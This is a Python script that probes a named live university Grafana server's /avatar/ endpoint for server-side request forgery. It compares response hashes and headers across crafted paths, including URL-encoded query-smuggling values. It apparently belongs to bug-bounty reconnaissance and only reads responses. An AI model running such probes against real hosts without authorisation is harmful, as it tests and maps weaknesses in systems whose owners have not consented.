# -*- coding: utf-8 -*-
"""第 2 轮：判定 /avatar/* 是真实外部取回还是回退固定默认图（只读，红线同上）"""
import time, json, hashlib, requests, urllib3
urllib3.disable_warnings()

OUT = r"E:\kimi\scan\fofa_pool\edusrc_ssrf_probe2_20261110.json"
BASE = "http://gdcpic.stu.edu.cn:3000"
s = requests.Session(); s.trust_env = False
s.headers.update({"User-Agent": "Mozilla/5.0 Chrome/124", "Accept": "image/*,*/*;q=0.8"})

PROBES = [
    ("d_404",        "/avatar/00000000000000000000000000000000?d=404"),
    ("d_blank",      "/avatar/00000000000000000000000000000000?d=blank"),
    ("d_retro",      "/avatar/00000000000000000000000000000000?d=retro"),
    ("hash_inject_blank", "/avatar/test%3fd%3dblank"),
    ("hash_inject_404",   "/avatar/test%3fd%3d404"),
    ("no_hash",      "/avatar/"),
    ("root_static",  "/public/img/grafana_icon.svg"),
]

def probe(name, path):
    t0 = time.time()
    try:
        r = s.get(BASE + path, timeout=8, verify=False, allow_redirects=False)
        b = r.content
        return {"name": name, "path": path, "status": r.status_code,
                "elapsed": round(time.time() - t0, 2), "len": len(b),
                "md5": hashlib.md5(b).hexdigest()[:16],
                "ctype": r.headers.get("Content-Type", "")[:60],
                "cache": r.headers.get("Cache-Control", "")[:60],
                "etag": r.headers.get("ETag", "")[:60],
                "lastmod": r.headers.get("Last-Modified", "")[:60],
                "server": r.headers.get("Server", "")[:60],
                "location": r.headers.get("Location", "")[:100]}
    except Exception as e:
        return {"name": name, "path": path, "status": None,
                "err": type(e).__name__ + ":" + str(e)[:90],
                "elapsed": round(time.time() - t0, 2)}

res = {"ts": time.strftime("%Y-%m-%d %H:%M:%S"), "target": BASE,
       "goal": "区分：真实 SSRF（参数可控->内容不同） vs 固定默认图回退（全部相同）",
       "probes": []}
for name, path in PROBES:
    r = probe(name, path)
    res["probes"].append(r)
    print(name, "->", r.get("status"), "len", r.get("len"), "md5", r.get("md5"),
          "t", r.get("elapsed"), "cache", r.get("cache"), "etag", r.get("etag"), flush=True)
    json.dump(res, open(OUT, "w", encoding="utf-8"), ensure_ascii=False, indent=1)
    time.sleep(1.5)

m = set(r.get("md5") for r in res["probes"] if r.get("status") == 200 and r.get("ctype", "").startswith("image"))
print("image md5 variants:", len(m), flush=True)
print("saved", flush=True)
